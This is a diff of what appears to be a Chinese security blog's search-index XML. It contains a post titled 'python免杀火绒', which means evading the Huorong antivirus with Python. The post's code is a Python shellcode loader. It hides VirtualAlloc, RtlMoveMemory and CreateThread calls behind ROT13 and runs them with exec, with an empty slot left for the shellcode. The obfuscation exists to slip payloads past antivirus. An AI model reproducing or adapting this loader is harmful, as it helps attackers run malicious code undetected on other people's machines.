@@ -3,7 +3,7 @@
   <entry>
     <title>python免杀火绒</title>
     <url>/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</url>
-    <content><![CDATA[<span id="more"></span>
+    <content><![CDATA[<h2 id="python免杀火绒"><a href="#python免杀火绒" class="headerlink" title="python免杀火绒"></a>python免杀火绒</h2><span id="more"></span>
 
 <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"># 定义 ROT13 函数，用于加密/解密</span><br><span class="line">def rot13(message):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    for item in message:</span><br><span class="line">        if (ord(item)&gt;= ord(&#x27;A&#x27;) and ord(item)&lt;= ord(&#x27;M&#x27;)) or (ord(item)&gt;= ord(&#x27;a&#x27;) and ord(item)&lt;= ord(&#x27;m&#x27;)):</span><br><span class="line">            res += chr(ord(item)+13)</span><br><span class="line">        elif (ord(item)&gt;= ord(&#x27;N&#x27;) and ord(item)&lt;= ord(&#x27;Z&#x27;)) or (ord(item)&gt;= ord(&#x27;n&#x27;) and ord(item)&lt;= ord(&#x27;z&#x27;)):</span><br><span class="line">            res += chr(ord(item)-13)</span><br><span class="line">        else:</span><br><span class="line">            res += item</span><br><span class="line">    return res</span><br><span class="line"># 定义 shellcode，这是一个二进制可执行代码，填入shellcode</span><br><span class="line">shellcode=&#x27;&#x27;</span><br><span class="line"># 解析十六进制shellcode并转换为字节对象</span><br><span class="line"></span><br><span class="line">shellcode = bytes.fromhex(shellcode)</span><br><span class="line"></span><br><span class="line"># 定义 ROT13 加密的加载器字符串</span><br><span class="line">loader = &quot;pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)&quot;</span><br><span class="line">exec (rot13(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -501,8 +501,8 @@
         <category>实验</category>
       </categories>
       <tags>
-        <tag>随笔</tag>
         <tag>靶场</tag>
+        <tag>随笔</tag>
       </tags>
   </entry>
   <entry>
